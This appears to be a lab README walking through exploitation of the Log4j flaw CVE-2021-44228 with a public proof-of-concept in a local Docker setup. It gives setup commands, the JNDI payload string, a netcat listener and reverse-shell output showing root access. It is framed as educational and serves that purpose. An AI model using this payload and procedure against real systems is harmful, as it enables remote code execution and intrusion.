# Documentation

## Exploiting the Log4j Vulnerability (CVE-2021-44228)

### Introduction

This repository provides a comprehensive guide to exploiting the Log4j vulnerability, also known as CVE-2021-44228. The objective is to understand the exploit's mechanics and underscore the critical importance of securing systems against such vulnerabilities. This project is strictly for educational purposes and aims to promote awareness and better defensive practices in cybersecurity.

### Prerequisites

Before proceeding, ensure you have the following:

- A Kali Linux system
- Basic understanding of Docker and Python
- Internet connectivity for downloading necessary tools and dependencies

### Steps

#### 1. Setting Up the Environment

##### 1.1 Install Necessary Packages

Ensure your system is up-to-date and install the required packages:

```bash
sudo apt update
sudo apt install docker.io python3-pip
```

##### 1.2 Clone the Log4j PoC Repository

Clone the repository containing the proof-of-concept code:

```bash
cd ~
sudo git clone https://github.com/kozmer/log4j-shell-poc
cd log4j-shell-poc
```

#### 2. Preparing the Exploit

##### 2.1 Download and Extract JDK

Download and move the JDK to the PoC directory, then extract it:

```bash
cd ~/Downloads
sudo mv jdk-8u20-linux-x64.tar.gz ~/log4j-shell-poc
cd ~/log4j-shell-poc
sudo tar -xf jdk-8u20-linux-x64.tar.gz
```

##### 2.2 Install Python Dependencies

Install the required Python dependencies:

```bash
pip install -r requirements.txt
```

#### 3. Running the Exploit

##### 3.1 Start the LDAP and Web Servers

Run the PoC script to set up the LDAP and web servers:

```bash
sudo python3 poc.py --userip localhost --webport 8000 --lport 9001
```

You should see the following output indicating the servers are set up correctly:

```
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://localhost:8000/Exploit.class
127.0.0.1 - - [02/Aug/2024 19:54:29] "GET /Exploit.class HTTP/1.1" 200 -
```

##### 3.2 Set Up Netcat Listener

Open another terminal and set up a Netcat listener on port 9001:

```bash
nc -lvnp 9001
```

##### 3.3 Build and Run the Docker Container

Build and run the Docker container to deploy the vulnerable application:

```bash
sudo docker build -t log4j-shell-poc .
sudo docker run --network host log4j-shell-poc
```

#### 4. Triggering the Exploit

Send the malicious payload to the vulnerable application:

```
${jndi:ldap://localhost:1389/a}
```

This payload exploits the Log4j vulnerability by leveraging JNDI to fetch and execute a malicious Java class, resulting in a reverse shell connection.

#### 5. Verifying the Exploit

In the Netcat listener terminal, verify that you have received a connection:

```
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60262
```

You can now execute commands on the target system through the reverse shell. For example:

```bash
ls
```

The output should display the contents of the target system's directory:

```
LICENSE
NOTICE
RELEASE-NOTES
RUNNING.txt
bin
conf
include
lib
logs
native-jni-lib
temp
webapps
work
```

To identify the user, you can use the `whoami` command:

```bash
whoami
```

The output should display:

```
root
```

### Conclusion

This guide demonstrates exploiting the Log4j vulnerability using a proof-of-concept setup. It highlights the importance of understanding and mitigating such vulnerabilities to enhance cybersecurity defenses. Always ensure to follow best practices and keep systems updated to prevent exploitation.

### Disclaimer

This documentation is for educational purposes only. Unauthorized exploitation of vulnerabilities is illegal and unethical. Always conduct security testing in a controlled and authorized environment.
